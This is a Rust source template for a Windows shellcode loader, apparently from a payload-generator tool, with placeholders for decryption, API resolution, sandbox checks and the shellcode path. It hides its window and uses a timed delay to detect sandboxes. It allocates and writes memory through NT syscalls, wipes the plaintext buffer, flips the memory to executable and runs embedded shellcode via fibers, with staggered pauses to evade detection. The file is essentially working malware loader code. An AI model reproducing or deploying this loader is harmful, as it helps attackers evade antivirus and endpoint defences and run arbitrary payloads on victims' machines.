#![windows_subsystem = "windows"]
#![allow(non_snake_case, non_camel_case_types)]

use std::include_bytes;
use std::ptr::null_mut;
use core::ffi::c_void;

use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
};
use windows_sys::Win32::System::Threading::{
    ConvertThreadToFiber, CreateFiberEx, SwitchToFiber, LPFIBER_START_ROUTINE,
};

use std::time::Instant;

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

{{STR_DECODER}}

{{API_RESOLVER}}

type HANDLE = *mut c_void;

#[inline]
fn nt_success(s: i32) -> bool { s >= 0 }

{{NT_CALL_MACRO}}

fn pause(ms: i64) {
    let interval: i64 = -(ms * 10_000);
    let _ = ntcall!("NtDelayExecution", 0u32, &interval as *const i64);
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn enhance(mut buf: Vec<u8>) {
    let current_process: HANDLE = -1isize as HANDLE;

    let mut base: *mut c_void = null_mut();
    let mut size: usize = buf.len();
    let s = ntcall!("NtAllocateVirtualMemory",
        current_process,
        &mut base as *mut *mut c_void,
        0usize,
        &mut size as *mut usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if !nt_success(s) { return; }

    pause(150);

    let buf_len = buf.len();
    let mut written: usize = 0;
    let s = ntcall!("NtWriteVirtualMemory",
        current_process,
        base,
        buf.as_mut_ptr() as *mut c_void,
        buf_len,
        &mut written as *mut usize,
    );
    if !nt_success(s) { return; }

    wipe(&mut buf);
    pause(200);

    let mut old_protect: u32 = 0;
    let mut region_size = buf_len;
    let s = ntcall!("NtProtectVirtualMemory",
        current_process,
        &mut base as *mut *mut c_void,
        &mut region_size as *mut usize,
        PAGE_EXECUTE_READ,
        &mut old_protect as *mut u32,
    );
    if !nt_success(s) { return; }

    pause(100);

    unsafe {
        let buf_ptr: LPFIBER_START_ROUTINE = core::mem::transmute(base);
        let buf_fiber_address = CreateFiberEx(0, 0, 0, buf_ptr, null_mut());
        if buf_fiber_address.is_null() { return; }

        let primary_fiber_address = ConvertThreadToFiber(null_mut());
        if primary_fiber_address.is_null() { return; }

        SwitchToFiber(buf_fiber_address);
    }
}

fn main() {
    {{SANDBOX}}

    if !check_environment() { return; }

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    enhance(vec);
}

{{DLL_MAIN}}
